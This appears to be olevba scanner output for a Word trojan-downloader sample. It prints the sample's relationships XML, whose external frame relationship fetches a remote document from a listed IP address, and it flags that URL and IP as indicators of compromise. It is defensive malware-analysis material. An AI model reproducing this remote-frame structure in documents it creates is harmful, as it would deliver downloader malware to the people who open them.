olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Downloader.MSWord.Agent.buh
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Trojan-Downloader.MSWord.Agent.buh 
in file: ./Trojan-Downloader.MSWord.Agent.buh - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships 
    xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="http://192.3.141.134/document_d.doc" TargetMode="External"/>
</Relationships>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://192.3.141.134|URL                                          |
|          |/document_d.doc     |                                             |
|IOC       |192.3.141.134       |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

